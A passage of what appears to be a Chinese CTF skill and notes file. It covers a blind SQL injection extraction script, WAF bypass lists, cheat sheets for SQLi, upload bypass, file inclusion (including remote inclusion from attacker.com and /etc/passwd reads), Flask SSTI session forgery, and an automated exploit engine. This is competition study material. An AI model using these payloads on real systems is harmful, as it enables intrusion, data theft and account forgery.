        expr="left(right(current_database(),-${i}),1)"
    fi
    ascii=$(curl -s --max-time 5 "${URL}&pulse=x%27UNION%20VALUES(%27%27||ASCII(${expr}))--" | python3 -c "import sys,json; print(json.load(sys.stdin).get('signal',{}).get('pulse_quality',0))")
    char=$(printf "\\$(printf '%03o' "$ascii")")
    echo "Position $((i+1)): ASCII=$ascii char='$char'"
done
```

**已验证可提取的数据**:
- `current_database()` → `ctfdb`
- `current_setting('server_version')` → `11.17`
- `current_setting('search_path')` → `"$user", public`

**WAF允许的SQL函数(可直接在VALUES中使用)**:
- `current_database()`, `current_setting()`, `current_user`
- `trim()`, `upper()`, `lower()`, `reverse()`, `initcap()`
- `left()`, `right()` ← substring的替代品
- `ASCII()` ← 仅直接调用时可用，子查询中被拦
- `set_config()`, `pg_backend_pid()`
- `current_setting('param', true)` ← missing_ok参数避免不存在时报错

**WAF拦截的函数**:
- `substring()`, `replace()`, `regexp_replace()`, `translate()`
- `length()`, `char_length()`, `octet_length()`, `strpos()`, `position()`
- `overlay()`, `lpad()`, `rpad()`, `split_part()`
- `pg_read_file()`, `lo_import()`, `lo_from_bytea()`
- `dblink_connect()`, `dblink_exec()`

### 绕过思路优先级

1. **`UNION VALUES(expr)` ← 首选!** 完全绕过 @detectSQLi，可调用函数和运算符
2. **`UN/**/ION ALL SEL/**/ECT 'X' AS quality` 模板**(关键字内部分割)
3. **PostgreSQL 特有运算符**: `~*`(正则), `!~*`, `BETWEEN SYMMETRIC`, `IS TRUE/FALSE`
4. **算术错误泄露**: `/0`, `1/0` 等触发 divide by zero 错误并暴露数据
5. **chunked transfer / Content-Type 切换** / **Cookie 注入**(WAF 不查)

### 关联参考
- `references/waf-bypass-patterns.md` — 完整 WAF 绕过技术库
- `references/plpgsql-execute-injection.md` — PL/pgSQL EXECUTE 字符串拼接注入模式识别与利用

---

## SQL注入速查

```
检测: ' OR 1=1-- / " OR 1=1-- / ') OR 1=1--
联合: -1 UNION SELECT 1,2,3--
报错: ' AND extractvalue(1,concat(0x7e,(SELECT database())))--
盲注: ' AND SLEEP(5)--
工具: sqlmap -u URL --batch --dbs
绕过: /**/代替空格, 双写关键字, 大小写混合, %0a换行
```

## 文件上传绕过

```
后缀: .php3 .php5 .phtml .phar .jspx .asa .cer
Content-Type: image/jpeg / image/png
文件头: GIF89a / \x89PNG
双重后缀: shell.php.jpg / shell.php%00.jpg
配置文件: .htaccess (AddType) / .user.ini (auto_prepend_file)
竞争条件: 上传→执行→删除(来不及删除)
```

## 文件包含

```
本地: ?page=../../../../etc/passwd
绕过: ....//....//....//etc/passwd (str_replace('../','')单次替换, 详见 references/path-traversal-filter-bypass.md)
PHP: ?page=php://filter/convert.base64-encode/resource=index.php
远程: ?page=http://attacker.com/shell.txt
日志投毒: User-Agent写入PHP代码 → 包含日志文件
```

## Flask SSTI

```
确认: {{7*7}} → 49
提取密钥: {{config.SECRET_KEY}} (不需要__globals__, 绕过大多数黑名单)
伪造session: flask-unsign --sign --cookie "{'user_id':1,'role':'admin'}" --secret 'KEY'
详见 references/flask-ssti-session-forgery.md
```

## Crypto 常见模式

```
凯撒: 暴力枚举25种偏移
维吉尼亚: 频率分析/已知密钥
栅栏: 尝试2-10栏
RSA: 小e直接开方, 共模攻击, factordb.com因数分解
Base64: 检查是否多层编码
XOR: 单字节暴力(0-255)
```

## Misc 隐写检查流程

```
1. file FILE (确认类型)
2. strings FILE (搜索flag/关键词)
3. binwalk FILE (嵌入文件)
4. exiftool FILE (元数据, trailer警告!)
5. PNG: pngcheck FILE (完整性)
6. PNG: zsteg -a FILE (全位平面LSB)
7. PNG: stegoveritas FILE -trailing -carve -imageTransform -out /tmp/sv
8. JPEG: steghide extract -sf FILE -p ""
9. 高度篡改: 修改PNG IHDR高度字节
10. Trailer数据: 系统性密钥推导→XOR/AES/RC4 (详见 references/misc-png-forensics.md)
11. 音频: Audacity频谱图
12. 流量: Wireshark导出HTTP对象
13. 多文件: 题目说"每张图"或文件名带编号→需要所有文件拼接
14. 多题联动: 搜索同比赛其他题目附件→找编码提示/共享XOR密钥 (如shadow_09提示"BASE64 PLUS XOR")
15. 搜索: 题目名+CTF+writeup (Bing/Chat01.ai/CSDN/CN-SEC)
```

## 用户偏好 Writeup 格式

用户要求的writeup结构（4步式，简明直接）：

```
题目名称：xxx
题目类型：WEB/Crypto/Misc/Reverse/PWN
难度：初级/中级/高级
分值：xxx分
靶机地址：xxx

一、解题过程

1. 获取到某某文件 — 描述访问目标、获取源码/文件的过程
2. 然后利用某某工具 — 描述使用的工具和分析过程
3. 再去利用某某编码/技术 — 描述编码/解码/构造payload等技术手段
4. 然后解出flag — 给出最终flag

二、漏洞分析

【1-2段简明的漏洞原理分析和危害说明】
```

关键原则:
- 简洁直接，不要长篇大论
- 每步一句话概括核心动作（"获取到""利用""再去""解出"）
- flag单独一行突出显示
- 漏洞分析要说明根因和危害
- 不用HTML，纯文本
- 代码审计题：强调"源码分析发现"→"构造Payload"→"触发漏洞"
参考: references/ctf-writeup-format.md

## 自动化工具包

完整离线CTF工具包见 `ctf-automation-toolkit` 技能,包含:
- Python自动化引擎 (端点发现→漏洞检测→自动利用→Flag提取)
- 40+bash脚本覆盖全题型
- tkinter GUI一键操作
- 靶场实战验证通过 (SQLi/CMDi/LFI/SSTI/XSS 5/5检出)

## 离线自动化工具包

完整离线工具包位于 `/root/ctf-toolkit/`，包含:
- `engine.py` — Python自动化引擎 (端点发现→漏洞检测→自动利用→Flag提取)
- `gui/ctf_gui.py` — tkinter GUI (一键攻击按钮)
- 34个bash脚本 + 7个Python脚本 + 4个字典
- 详细架构: `references/offline-toolkit-architecture.md`

关键命令:
```
ctf engine <目标>    # 全自动攻击链
ctf-gui              # 图形界面
ctf web-recon <URL>  # Web侦察
ctf exploit <URL>    # Web一键利用
```

## 自动化引擎 v6 (离线CTF一体机)

详见 `references/offline-engine-architecture.md` — 完整引擎架构、插件设计、漏洞覆盖矩阵。
详见 `references/awd-defense-module.md` — AWD防御模块: 文件完整性/Webshell扫描/WAF规则/流量分析。

### 引擎v6架构: 插件式
- 21个自动注册漏洞插件 (`@register` 装饰器)
- 智能爬虫自动提取链接/表单参数/JS路由
- Finding数据类结构化输出(JSON)
- argparse命令行 (--web-only/--no-brute/--timeout等)

### 21个漏洞插件
| 插件 | 严重度 | 自动利用 |
|------|--------|---------|
| sqli | CRITICAL | UNION提取(DBMS感知) |
| cmdi | CRITICAL | nonce确认+命令执行 |
| lfi | HIGH | 读文件+PHP源码解码 |
| ssti | CRITICAL | RCE+SECRET_KEY |
| xss | MEDIUM | 反射检测 |
| idor | HIGH | 批量枚举1-50 |
| graphql | HIGH | 内省+数据提取 |
| ssrf | HIGH | 云元数据+file协议 |
| open_redirect | LOW | Location检测 |
| jwt | HIGH | alg=none检测 |
| download_traversal | HIGH | 文件读取 |
| cors | MEDIUM | ACAC检测 |
| upload | HIGH | shell执行验证 |
| auth_bypass | HIGH | 页面大小检测 |
| info_leak | MEDIUM | 凭证正则提取 |
| sensitive_file | MEDIUM | 端点记录 |
| deserialization | CRITICAL | PHP/Java/Py/Node magic |
| nosqli | HIGH | MongoDB $ne/$gt |
| csrf | MEDIUM | 表单token检测 |
| framework_exploit | CRITICAL | Flask/Spring/ThinkPHP |
| host_header | MEDIUM | Host注入检测 |

### 关键设计
1. **智能爬虫** — 自动从HTML提取链接/表单/参数，注入到漏洞检测
2. **GET+POST双测** — 很多CTF靶场用POST，只测GET会漏掉
3. **自动利用链** — SQLi→UNION / CMDi→命令执行 / LFI→读文件 / SSTI→RCE
4. **Flag多维提取** — 文件+环境变量+内存+数据库+战利品递归
5. **结构化输出** — Finding数据类 + JSON findings.json

### PITFALL: urllib双重编码
Python `urllib.request.urlopen` 会自动编码URL中的特殊字符，导致 `%27` 变成 `%2527`。
```python
# 错误: urllib会把已编码的%27再编码
resp = urllib.request.urlopen("http://target/sqli?id=%27")
# 正确: 传原始URL，不要预编码
resp = urllib.request.urlopen("http://target/sqli?id='")
```

### PITFALL: SQLite保留字作列名
SQLite中 `desc` 是保留字(ORDER BY DESC)。用作列名时必须用反引号:
```sql
-- 错误: SELECT id,name,desc FROM products
-- 正确: SELECT id,name,`desc` FROM products
```

### PITFALL: f-string中shell特殊字符
Python f-string中包含 `$`, `` ` ``, `!` 等shell特殊字符时会出错:
```python
# 错误: f"echo {payload}"  # payload含$()时出错
# 正确: 用subprocess.run + list参数，或用repr()转义
```

### PITFALL: masscan扫描localhost
masscan在localhost上不一定能找到所有端口。引擎应同时用nmap --top-ports作为fallback。

### Java 21 Security Manager绕过 (CTF pwn题)

Java 21中 `System.setSecurityManager()` 已废弃，反射设置也会失败:
```java
// ❌ Java 21中无效
Field f = System.class.getDeclaredField("security");
f.setAccessible(true);
f.set(null, null);
System.setSecurityManager(null);  // 抛出UnsupportedOperationException
```

当 `restrict.policy` 为空 (`grant {};`) 时，Java代码无任何文件/执行权限。

**需要的绕过方向**:
- JNI native code层绕过 (pyjnius等桥接库的native实现)
- 内存利用 (libc基址泄露通常暗示此方向)
- `sun.misc.Unsafe` 反射访问 (可能也被Security Manager阻止)
- 自定义ClassLoader绕过类加载限制

## 离线自动化引擎架构

当需要在隔离网络中构建完整自动化工具链时，参考:
- `references/offline-engine-architecture.md` — 引擎设计/插件化/漏洞类型覆盖/GPT联合诊断结果

### 引擎核心模块
1. **目标规范化** — 支持URL和IP输入，自动提取host/port/scheme
2. **端点发现** — 并行20线程扫描30+路径，按漏洞类型分类
3. **漏洞检测** — 同时测试GET和POST，10种Web漏洞+6种服务漏洞
4. **自动利用** — SQLi→UNION提取 / CMDi→命令执行 / LFI→读文件 / SSTI→RCE
5. **Flag提取** — 5维搜索(文件/环境变量/内存/数据库/战利品)

### GUI设计原则 (用户明确要求)
- **简洁功能优先**，不要花哨配色
- ttk统一管理布局，不要pack/grid混用导致错位
- 顶部全局目标输入，所有按钮共享
- 右侧大输出区，关键行自动高亮
- 一键攻击按钮(大红色)直接调用引擎
- 底部快捷命令栏(常用payload一键复制)

PITFALL: Python环境 (CTF工具包)
`/usr/local/bin/python3` 会hang住，用 `/usr/bin/python` (Python 3.13.7)。
CTF工具包脚本头部应写 `#!/usr/bin/python`，运行用 `python` 不是 `python3`。

## 比赛策略

### 赛前准备 (比赛开始前必做)
1. **读规则**: 确认积分衰减机制（前N名100%/90%/80%...）、flag格式要求、writeup模板下载/上传时间窗口
2. **记录关键时间**: 题目分批发放时间、writeup截止时间、签到要求
3. **确认提交方式**: flag格式（含/不含flag{}）、是否需要writeup、是否有反作弊检测

### 解题优先级
1. **前30分钟**: 浏览所有题目，标记简单题（签到题/分值低但快）
2. **Web优先**: 通常题目最多，得分快
3. **Misc快速**: 文件分析/签到题往往最简单
4. **Crypto别死磕**: 5分钟没思路就跳过
5. **PWN看情况**: 简单栈溢出可以尝试
6. **拿到flag立即提交**: 不要等（积分衰减机制下时间=分数）
7. **搜索技巧**: 题目名 + CVE/writeup
8. **团队分工**: Web/Misc/Crypto/PWN各负责

### 签到题模式 (常见于国内CTF)
签到题通常是最简单的入门题，常见类型：
- 损坏压缩包 → base64/hex/ROT13解码
- 隐藏信息 → 源码注释/图片EXIF/流量分析
- 简单Web → 客户端验证绕过/JS混淆
- 编码识别 → 多层编码嵌套（base64→hex→base64）

## PITFALL: Java 21 Security Manager 反射禁用失败

Java 21 中 `System.setSecurityManager()` 已标记为 `@Deprecated(forRemoval=true)`。通过反射设置 `System.security = null` 后调用 `System.setSecurityManager(null)` 会抛出 `UnsupportedOperationException`。

当遇到 Java Security Manager 限制时的替代绕过思路:
1. **JNI native methods** — JNI 层面可能绕过 Security Manager（但 `System.loadLibrary()` 也需要权限）
2. **sun.misc.Unsafe** — 低级内存操作，`f.setAccessible(true)` 本身可能被 SM 拦截
3. **空策略 `grant {};`** — 不代表"全部允许"，而是"无权限"，所有文件/网络操作被拒
4. **pyjnius JNI 层漏洞** — Python-Java 桥接层可能存在内存损坏（如 gift() 泄露 libc 基址暗示的路径）

## PITFALL: Kolobok/Pyodide 类 Web 游戏 Sandbox 限制

Web CTF 游戏题的 Python sandbox 常见限制:
- 禁止 `import` 语句
- 禁止双下划线属性 (`__name__`, `__class__` 等)
- 禁止三元表达式 (`x if c else y` → AST IfExp 节点)
- 禁止 `lambda` 表达式
- 禁止 `list()` 构造函数（NameError）
- 允许: `range()`, `len()`, 索引访问, `print()`, 算术运算, if/else 语句

游戏方向映射通常: 0=不动, 1=左, 2=右, 3=上, 4=下（需验证）

---

## PITFALL: bash脚本中函数定义位置

在bash脚本中，函数必须在case语句之前定义，否则会报"未找到命令"错误。

```bash
# ❌ 错误: 函数定义在case语句之后
case "$1" in
    my-cmd) my_func "$@" ;;  # my_func未定义
esac
my_func() { echo "hello"; }  # 太晚了

# ✅ 正确: 函数定义在case语句之前
my_func() { echo "hello"; }
case "$1" in
    my-cmd) my_func "$@" ;;
esac
```

## PITFALL: python3 vs python 命令

某些环境中 `python3` 命令可能被劫持或超时，但 `python` 正常工作。

```bash
# ❌ 可能超时
python3 script.py

# ✅ 替代方案
python script.py

# 检查哪个可用
which python3 || which python
```

在ctf.sh中使用 `python` 而非 `python3` 以避免兼容性问题。

## PITFALL: urllib导入位置

在Python模块中，`urllib` 必须在模块顶部导入，不能在函数内部导入后使用。

```python
# ❌ 错误: 函数内部使用未导入的urllib
def my_func():
    url = f"http://target?id={urllib.parse.quote(payload)}"  # UnboundLocalError

# ✅ 正确: 模块顶部导入
import urllib.parse

def my_func():
    url = f"http://target?id={urllib.parse.quote(payload)}"
```

## 引擎开发记录 (原 ctf-automation-engine / ctf-automation-toolkit)

引擎架构和GUI开发的详细记录已归档:
- `references/ctf-automation-engine/plugin-expansion-20260603.md` — 插件扩展记录 (16→29个,新增服务利用)
- `references/ctf-automation-engine/gpt-the agent-diagnosis-20260603.md` — GPT协作诊断记录
- `references/ctf-automation-toolkit/engine-debug-log.md` — 引擎开发bug和修复记录
- `references/ctf-automation-toolkit/gui-v4-redesign.md` — GUI v3→v4→v4.1重设计记录 (emoji教训/用户偏好)
- `references/ctf-automation-toolkit/sas-ctf-2026-automation.md` — SAS CTF 2026自动化经验 (WAF绕过/游戏题/PDF泄露)

## 离线CTF工具包自动化开发模式

开发离线CTF工具包时，遵循以下架构模式:

1. **模块化设计**: 每个功能独立模块 (waf_bypass.py, game_auto.py)
2. **统一入口**: ctf.sh作为主入口，case语句路由到各模块
3. **智能引擎**: auto_ctf.py作为决策中心，自动选择工具链
4. **GUI集成**: tkinter图形界面，新增功能添加到独立标签页
5. **测试脚本**: test_simple.sh验证所有模块加载和基本功能

**用户明确要求**: "每个功能都能被自动化使用" - 不是手动一个个调用，而是智能调度

**开发流程**:
1. 创建功能模块 (Python)
2. 集成到ctf.sh (bash case语句)
3. 更新GUI (添加标签页/按钮)
4. 编写测试脚本
5. 验证所有功能正常

---

## Flag格式注意

常见格式: flag{xxx} / ctf{xxx} / FLAG{xxx} / flag-xxx
提交前检查: 多余空格/换行/大小写

## Flag被拒排查流程

当服务端返回的flag在竞赛平台提交被拒时，按顺序尝试：
1. 原样提交: flag{xxx}
2. 去外层: xxx（仅hash部分）
3. 全大写: FLAG{XXX}
4. 检查多余空格/换行（echo -n去尾部\n）
5. 检查是否有多层编码（base64/hex嵌套）
6. 确认是否同session返回不同flag（刷新session重试）
7. 检查flag内容是否含特殊字符（下划线/连字符易混淆）
若均失败，可能需要换方法获取flag（如必须实际完成游戏操作）

## 浏览器游戏/交互题解题模式

Web CTF中出现"玩游戏得flag"类题目，通用解题流程：

1. 查看页面源码（Ctrl+U / curl），找JS中flag获取逻辑
2. 找到score提交的API端点（通常是fetch/XMLHttpRequest POST）
3. 优先尝试直接curl POST伪造score（无签名校验时直接成功）
4. 若直接POST的flag被拒，改用浏览器console操作：
   a. clearInterval(gameLoop) 停止游戏
   b. 直接修改score变量 + document.getElementById更新显示
   c. 拦截fetch: window.fetch = function(url,opts){ return origFetch(...).then(r => r.clone().text().then(t => {console.log(t); return r})) }
   d. 调用checkWin(score)触发提交，从console看原始响应
5. 若必须实际玩到目标分，注入auto-play bot（setInterval 10ms加速）
6. 检查服务端是否有session/game_token验证（FormData vs JSON vs URL参数）

参考: references/client-side-game-ctf.md

关键: 先路径A，失败则路径B，最后路径C。大多数CTF游戏题是路径A。

### PITFALL: curl session cookie 不生效 (PHPSESSID)

场景: 用 curl `-b cookies.txt -c cookies.txt` 保持session，但服务端返回 "Authentication required"。

原因: curl 的 Netscape cookie 格式在处理带端口的URL时，cookie domain 匹配可能失败。

可靠做法 — 显式传递session ID：
```bash
# 1. 先访问首页，从响应头提取session
SESS=$(curl -sv http://target:port/ 2>&1 | grep -oP 'PHPSESSID=\K[^;]+')

# 2. 后续请求用 -H 显式传cookie（不要用 -b cookie文件）
curl -s -b "PHPSESSID=$SESS" -X POST http://target:port/api/endpoint -d 'param=value'

# 3. 多步操作时保持同一SESS变量
curl -s -b "PHPSESSID=$SESS" -X POST http://target:port/buy.php -d 'item=flag'
```

### PITFALL: 服务端返回flag但平台拒绝

场景: 通过伪造POST请求获取到flag字符串，但竞赛平台显示"答案错误"。

案例(御网杯贪吃蛇题): 服务端始终返回 `flag{5cf1ef3539860b778211db423b4f6558}`，但平台拒绝。
尝试了: 原样/去flag{}/大写/不同session/浏览器console操作 → 全部相同flag，全部被拒。
可能原因: 平台有反作弊检测、flag已过期/更换、或需要特定的游戏完成路径。

原因分析:
- 服务端可能有session/cookie级别的游戏状态校验
- 可能需要通过实际游戏流程触发flag生成（服务端跟踪游戏过程）
- flag可能是动态生成的，每次请求结果不同
- 可能存在隐藏的校验参数（如game_token/timestamp/signature）
- 可能需要特定的Content-Type或请求头

正确做法:
1. 先确认flag格式是否正确（含/不含flag{}前缀）
2. 检查是否有额外的请求头或cookie要求
3. 尝试在浏览器console中操作游戏变量，让游戏自然结束触发checkWin
4. 检查是否有隐藏的表单字段或额外的验证请求
5. 尝试通过浏览器Network面板抓包对比正常提交和伪造提交的差异
6. 如果以上都不行，考虑需要真正玩到目标分数（用JS自动控制）

### PITFALL: Web游戏类CTF题的两种思路

游戏类题目（贪吃蛇、Flappy Bird、2048等）通常有两条路:

路径A — 客户端伪造 (先尝试，快):
  curl -X POST URL -F 'score=300'  # 直接提交目标分数
  如果返回flag且平台接受 → 完成

路径B — JS注入自动玩 (伪造不行时):
  // 浏览器console中:
  score = 300;  // 直接改分数
  // 或者重写游戏逻辑让蛇自动吃食物
  // 然后触发正常的游戏结束流程

路径C — 全自动游戏脚本 (需要真正玩到目标分时):
  用JavaScript编写自动寻路算法（贪吃蛇可用BFS/DFS），
  通过setInterval控制蛇的移动方向，自动吃到足够食物。

关键: 先路径A，失败则路径B，最后路径C。大多数CTF游戏题是路径A。
